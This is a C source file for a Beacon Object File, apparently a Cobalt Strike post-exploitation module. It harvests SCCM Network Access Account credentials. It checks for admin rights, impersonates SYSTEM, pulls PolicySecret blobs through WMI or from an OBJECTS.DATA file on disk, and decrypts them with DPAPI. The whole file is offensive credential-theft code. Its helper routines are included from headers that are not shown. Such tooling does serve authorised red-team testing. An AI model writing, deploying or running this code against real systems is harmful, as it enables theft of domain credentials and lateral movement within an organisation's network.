/*
 * sccm.c — BOF for SCCM credential triage
 *
 * Usage:
 *   sccm [/target:PATH]
 *
 * Defaults to live SCCM WMI triage (CRED-3) and decrypts
 * NAA PolicySecret blobs locally with CryptUnprotectData as SYSTEM.
 * If /target:PATH is supplied, parses OBJECTS.DATA from disk (CRED-4).
 * Requires high integrity (admin).
 */
#include "beacon.h"
#include "bofdefs.h"
#include "triage.h"
#include "helpers.h"

void go(char* args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);

    char* target_str = BeaconDataExtract(&parser, NULL);

    if (!is_high_integrity()) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] SCCM triage requires high integrity (admin) context\n");
        return;
    }

    wchar_t* target = NULL;
    if (target_str && strlen(target_str) > 0) target = utf8_to_wide(target_str);

    BeaconPrintf(CALLBACK_OUTPUT, "\n=== DPAPI SCCM (BOF) ===\n");

    BOOL already_system = is_system();
    BOOL impersonated = FALSE;

    if (!already_system) {
        if (!get_system()) {
            BeaconPrintf(CALLBACK_ERROR,
                "[!] Failed to impersonate SYSTEM; local SCCM DPAPI decrypt requires a SYSTEM token\n");
            if (target) intFree(target);
            return;
        }
        impersonated = TRUE;
    }

    if (target) {
        triage_sccm(NULL, target);
    } else {
        triage_sccm_wmi();
    }

    if (impersonated) revert_to_self_helper();
    if (target) intFree(target);
}
